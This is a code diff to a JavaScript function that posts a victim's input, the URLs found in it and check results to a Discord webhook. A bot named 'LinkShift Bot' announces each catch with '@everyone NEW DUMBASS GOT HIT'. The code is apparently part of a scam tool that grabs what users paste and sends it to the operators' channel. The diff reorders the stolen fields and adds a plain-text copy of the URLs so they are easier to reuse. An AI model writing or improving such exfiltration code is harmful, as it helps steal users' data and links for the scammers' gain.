@@ -99,18 +99,18 @@ async function sendToWebhook(data) {
             timestamp: new Date().toISOString(),
             fields: [
                 {
-                    name: "📝 Input Content",
-                    value: data.input.substring(0, 1024) || "No content",
-                    inline: false
-                },
-                {
-                    name: "🔗 URLs Found",
-                    value: data.urls.length > 0 ? data.urls.join('\n').substring(0, 1024) : "No URLs detected",
+                    name: "🔗 URLs Found (Click to copy)",
+                    value: data.urls.length > 0 ? data.urls.map(url => `\`${url}\``).join('\n').substring(0, 1024) : "No URLs detected",
                     inline: false
                 },
                 {
                     name: "📊 Results",
                     value: data.results.map(r => `${r.status.toUpperCase()}: ${r.url}`).join('\n').substring(0, 1024) || "No results",
+                    inline: false
+                },
+                {
+                    name: "📝 Full Input",
+                    value: data.input.substring(0, 1024) || "No content",
                     inline: false
                 },
                 {
@@ -121,13 +121,18 @@ async function sendToWebhook(data) {
             ]
         };
 
+        // Also send URLs as plain text for easy copying
+        const urlMessage = data.urls.length > 0 ? 
+            `\`\`\`\n${data.urls.join('\n')}\n\`\`\`` : 
+            'No URLs found';
+        
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                content: '@everyone NEW DUMBASS GOT HIT 🤑💰💰',
+                content: `@everyone NEW DUMBASS GOT HIT 🤑💰💰\n\n**URLs to copy:**\n${urlMessage}`,
                 username: 'LinkShift Bot',
                 avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
                 embeds: [embed]
